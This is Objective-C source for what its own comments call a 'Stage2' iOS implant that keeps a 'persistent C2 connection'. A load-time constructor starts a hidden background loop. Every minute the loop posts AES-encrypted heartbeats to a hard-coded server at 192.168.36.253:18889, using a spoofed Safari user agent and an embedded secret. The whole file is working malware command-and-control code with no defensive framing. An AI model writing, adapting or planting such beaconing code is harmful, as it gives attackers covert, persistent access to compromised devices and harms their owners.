#import <Foundation/Foundation.h>
#import <CFNetwork/CFNetwork.h>
#import <CommonCrypto/CommonCryptor.h>
#import <CommonCrypto/CommonDigest.h>

/* ============================================================
 * Minimal Stage2 (heartbeat only): fixed base URL
 * Phase 1: keep a persistent C2 connection
 *   - POST /event heartbeat (AES-256-ECB, key=SHA256(secret+ts))
 *   - loop forever
 * ============================================================ */

static NSString *const kBaseURL = @"http://192.168.36.253:18889";
static NSString *const kEventPath = @"/event";
static NSString *const kHeartbeatSecret = @"Ek8pl31K2yeHgQwy";
static NSString *const kUserAgent =
    @"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) "
    @"AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1";

static NSData *PLHTTPRequest(NSString *urlString, NSString *method, NSData *postBody, NSInteger *statusOut);
static NSData *PLSHA256(NSData *data);
static NSData *PLAes256EcbEncrypt(NSData *plain, NSData *key);

/* ---------------- HTTP helper (CFNetwork) ---------------- */

static NSData *PLHTTPRequest(NSString *urlString, NSString *method, NSData *postBody, NSInteger *statusOut) {
    if (statusOut) *statusOut = -1;
    CFStringRef cfUrl = CFStringCreateWithCString(NULL, urlString.UTF8String, kCFStringEncodingUTF8);
    if (!cfUrl) return nil;
    CFURLRef url = CFURLCreateWithString(NULL, cfUrl, NULL);
    CFRelease(cfUrl);
    if (!url) return nil;

    CFHTTPMessageRef req = CFHTTPMessageCreateRequest(
        NULL,
        (__bridge CFStringRef)method,
        url,
        kCFHTTPVersion1_1);
    CFRelease(url);
    if (!req) return nil;

    CFHTTPMessageSetHeaderFieldValue(req, CFSTR("User-Agent"),
        (__bridge CFStringRef)kUserAgent);
    if (postBody && postBody.length > 0) {
        CFHTTPMessageSetBody(req, (__bridge CFDataRef)postBody);
        CFHTTPMessageSetHeaderFieldValue(req, CFSTR("Content-Type"),
            CFSTR("application/octet-stream"));
    }

    CFReadStreamRef stream = CFReadStreamCreateForHTTPRequest(NULL, req);
    CFRelease(req);
    if (!stream) return nil;

    if (!CFReadStreamOpen(stream)) {
        CFRelease(stream);
        return nil;
    }

    NSMutableData *out = [NSMutableData data];
    uint8_t buf[8192];
    CFIndex n;
    while ((n = CFReadStreamRead(stream, buf, sizeof(buf))) > 0) {
        [out appendBytes:buf length:(NSUInteger)n];
    }

    CFHTTPMessageRef resp = (CFHTTPMessageRef)CFReadStreamCopyProperty(
        stream, kCFStreamPropertyHTTPResponseHeader);
    if (statusOut && resp) {
        *statusOut = CFHTTPMessageGetResponseStatusCode(resp);
    }
    if (resp) CFRelease(resp);
    CFReadStreamClose(stream);
    CFRelease(stream);
    return out;
}

/* ---------------- crypto helpers (CommonCrypto) ---------------- */

static NSData *PLSHA256(NSData *data) {
    uint8_t digest[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(data.bytes, (CC_LONG)data.length, digest);
    return [NSData dataWithBytes:digest length:CC_SHA256_DIGEST_LENGTH];
}

static NSData *PLAes256EcbEncrypt(NSData *plain, NSData *key) {
    size_t outLen = ((plain.length + 15) / 16) * 16 + 16;
    NSMutableData *out = [NSMutableData dataWithLength:outLen];
    size_t moved = 0;
    CCCryptorStatus st = CCCrypt(
        kCCEncrypt, kCCAlgorithmAES, kCCOptionECBMode | kCCOptionPKCS7Padding,
        key.bytes, key.length, NULL,
        plain.bytes, plain.length,
        out.mutableBytes, outLen, &moved);
    if (st != kCCSuccess) return nil;
    out.length = moved;
    return out;
}

/* ---------------- heartbeat engine ---------------- */

static NSString *SaveDir(void) {
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    return paths.firstObject ?: @"/tmp";
}

static BOOL PLSendHeartbeat(void) {
    NSDate *now = [NSDate date];
    NSString *ts = [NSString stringWithFormat:@"%.0f", now.timeIntervalSince1970 * 1000.0];
    
    // 简单的心跳数据包
    NSString *plainString = [NSString stringWithFormat:@"heartbeat:%@", ts];
    NSData *plain = [plainString dataUsingEncoding:NSUTF8StringEncoding];

    // 生成加密密钥
    NSString *keyInput = [kHeartbeatSecret stringByAppendingString:ts];
    NSData *key = PLSHA256([keyInput dataUsingEncoding:NSUTF8StringEncoding]);
    
    // 加密心跳数据
    NSData *cipher = PLAes256EcbEncrypt(plain, key);
    if (!cipher) {
        NSLog(@"[stage2] heartbeat encryption failed");
        return NO;
    }

    // 发送心跳包
    NSString *url = [kBaseURL stringByAppendingString:kEventPath];
    NSInteger status = 0;
    NSData *resp = PLHTTPRequest(url, @"POST", cipher, &status);

    // 记录日志
    NSLog(@"[stage2] heartbeat sent: ts=%@ status=%ld cipher_len=%zu", 
          ts, (long)status, cipher.length);
    
    // 保存发送记录用于调试
    NSString *logFile = [SaveDir() stringByAppendingPathComponent:@"heartbeat_log.txt"];
    NSString *logEntry = [NSString stringWithFormat:@"%@ - ts=%@ status=%ld\n", 
                         [NSDate date], ts, (long)status];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:logFile];
    if (!fh) {
        [logEntry writeToFile:logFile atomically:YES encoding:NSUTF8StringEncoding error:nil];
    } else {
        [fh seekToEndOfFile];
        [fh writeData:[logEntry dataUsingEncoding:NSUTF8StringEncoding]];
        [fh closeFile];
    }
    
    return resp != nil;
}

/* ---------------- entry point ---------------- */

__attribute__((constructor))
static void Stage2Entry(void) {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_BACKGROUND, 0), ^{
        NSLog(@"[stage2] heartbeat-only mode started");
        
        // 循环发送心跳包
        for (;;) {
            @autoreleasepool {
                PLSendHeartbeat();
                [NSThread sleepForTimeInterval:60.0]; // 每1分钟发送一次
            }
        }
    });
}
